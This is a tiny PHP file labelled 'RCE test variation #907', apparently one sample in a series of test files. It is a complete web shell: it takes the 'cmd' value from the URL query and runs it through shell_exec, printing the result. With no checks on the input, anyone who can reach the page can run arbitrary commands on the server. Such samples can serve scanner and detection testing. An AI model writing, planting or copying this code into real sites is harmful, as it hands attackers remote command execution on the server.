<?php
// RCE test variation #907
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>